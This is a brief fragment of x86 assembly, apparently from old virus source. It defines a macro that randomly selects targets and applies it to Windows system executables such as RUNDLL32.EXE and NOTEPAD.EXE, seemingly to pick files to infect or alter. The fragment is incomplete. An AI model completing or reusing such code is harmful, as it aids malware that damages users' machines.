
phile                   macro   x
                        local   __down
                        downgrade __down
                        rnd       3
                        jz        __down
                        mov     edi, ebx
                        x_stosd x
                        call    esi
__down:                 endm


                        phile   \SCANREGW.EXE~
                        phile   \RUNDLL32.EXE~
                        phile   \MPLAYER.EXE~
                        phile   \NOTEPAD.EXE~
                        phile   \CDPLAYER.EXE~

